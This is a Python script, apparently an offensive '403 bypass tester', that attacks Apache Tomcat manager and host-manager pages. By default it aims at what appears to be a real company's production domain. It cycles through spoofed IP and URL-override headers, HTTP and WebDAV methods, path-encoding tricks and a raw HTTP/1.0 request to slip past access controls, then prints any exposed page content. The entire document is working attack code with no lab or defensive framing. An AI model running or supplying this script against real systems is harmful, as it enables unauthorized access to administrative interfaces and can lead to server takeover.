import requests
import urllib3
import sys
import time

urllib3.disable_warnings()

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://paplweb.parleagro.com"
PATHS = sys.argv[2:] if len(sys.argv) > 2 else [
    "/manager/html",
    "/manager/status",
    "/manager/deploy",
    "/host-manager/html",
]

s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
s.verify = False

HEADER_BYPASSES = [
    ("X-Forwarded-For", "127.0.0.1"),
    ("X-Forwarded-For", "localhost"),
    ("X-Forwarded-For", "::1"),
    ("X-Forwarded-Host", "localhost"),
    ("X-Forwarded-Host", "127.0.0.1"),
    ("X-Real-IP", "127.0.0.1"),
    ("X-Real-IP", "localhost"),
    ("X-Originating-IP", "127.0.0.1"),
    ("X-Remote-IP", "127.0.0.1"),
    ("X-Remote-Addr", "127.0.0.1"),
    ("X-Client-IP", "127.0.0.1"),
    ("X-Forwarded-Proto", "https"),
    ("X-Original-URL", "/manager/html"),
    ("X-Rewrite-URL", "/manager/html"),
    ("X-Original-URL", "/"),
    ("X-Rewrite-URL", "/"),
    ("X-Custom-IP-Authorization", "127.0.0.1"),
    ("X-Forwarded-For", "10.0.0.1"),
    ("X-Forwarded-For", "192.168.1.1"),
    ("X-Forwarded-For", "172.16.0.1"),
    ("X-Forwarded-For", "2130706433"),
    ("X-Forwarded-For", "0x7f000001"),
]

METHOD_BYPASSES = [
    "GET",
    "POST",
    "PUT",
    "PATCH",
    "DELETE",
    "OPTIONS",
    "HEAD",
    "TRACE",
    "CONNECT",
    "PROPFIND",
    "MOVE",
    "COPY",
    "MKCOL",
    "LOCK",
    "UNLOCK",
    "SEARCH",
]

PATH_BYPASSES = [
    lambda p: p + "/",
    lambda p: p + "/.",
    lambda p: p + "//",
    lambda p: p + "/%2f",
    lambda p: p + "%00",
    lambda p: p + "?",
    lambda p: p + "?test",
    lambda p: p + "#",
    lambda p: p + ";/",
    lambda p: p.replace("/", "/%2f/"),
    lambda p: p.upper(),
    lambda p: p.lower(),
    lambda p: p + "/..;/",
    lambda p: "..;/" + p.lstrip("/"),
    lambda p: p + "/%20",
    lambda p: p + "/.htaccess",
    lambda p: p + "/*",
    lambda p: p.replace("/", "//"),
    lambda p: p.replace("manager", "Manager"),
    lambda p: p.replace("manager", "MANAGER"),
    lambda p: p + "/../",
]

print("=" * 80)
print("403 Bypass Tester - BRuteLogic inspired")
print("Target: %s" % TARGET)
print("Paths: %s" % ", ".join(PATHS))
print("=" * 80)

findings = []

for path in PATHS:
    print("\n--- Testing: %s ---" % path)

    # 1. Baseline
    try:
        r = s.get(TARGET + path, timeout=10)
        baseline = r.status_code
        print("[BASELINE] %s" % baseline)
    except Exception as e:
        print("[BASELINE] Error: %s" % e)
        baseline = 403

    # 2. Header bypasses
    for header, value in HEADER_BYPASSES:
        try:
            r = s.get(TARGET + path, timeout=10, headers={header: value})
            if r.status_code != baseline and r.status_code not in [404, 500]:
                print("[!! HEADER] %s: %s -> %d (%dB)" % (header, value, r.status_code, len(r.content)))
                findings.append({"type": "header", "bypass": "%s: %s" % (header, value), "path": path, "status": r.status_code})
                if r.status_code == 200:
                    print("  [BODY] %s" % r.text[:200])
        except:
            pass

    # 3. Method bypasses
    for method in METHOD_BYPASSES:
        try:
            r = s.request(method, TARGET + path, timeout=10)
            if r.status_code != baseline and r.status_code not in [404, 500]:
                print("[!! METHOD] %s -> %d (%dB)" % (method, r.status_code, len(r.content)))
                findings.append({"type": "method", "bypass": method, "path": path, "status": r.status_code})
                if r.status_code == 200:
                    print("  [BODY] %s" % r.text[:200])
        except:
            pass

    # 4. Path manipulation
    for transform in PATH_BYPASSES:
        try:
            transformed = transform(path)
            if transformed == path:
                continue
            r = s.get(TARGET + transformed, timeout=10)
            if r.status_code != baseline and r.status_code not in [404, 500]:
                print("[!! PATH] %s -> %d (%dB)" % (transformed, r.status_code, len(r.content)))
                findings.append({"type": "path", "bypass": transformed, "path": path, "status": r.status_code})
                if r.status_code == 200:
                    print("  [BODY] %s" % r.text[:200])
        except:
            pass

    # 5. HTTP/1.0
    try:
        import socket
        host = TARGET.replace("https://", "").replace("http://", "").split("/")[0]
        port = 443 if "https" in TARGET else 80
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((socket.gethostbyname(host), port))
        if "https" in TARGET:
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        req = "GET %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n" % (path, host)
        sock.sendall(req.encode())
        resp = b""
        while True:
            try:
                d = sock.recv(4096)
                if not d:
                    break
                resp += d
            except:
                break
        sock.close()
        status_line = resp.split(b"\r\n")[0].decode()
        if "200" in status_line:
            print("[!! HTTP/1.0] %s" % status_line)
            findings.append({"type": "protocol", "bypass": "HTTP/1.0", "path": path, "status": status_line})
    except:
        pass

print("\n" + "=" * 80)
print("SUMMARY: %d bypass attempts found" % len(findings))
for f in findings:
    print("  [%s] %s | %s -> %s" % (f["type"], f["bypass"], f["path"], f.get("status", "?")))
if not findings:
    print("  No bypass found.")
print("=" * 80)
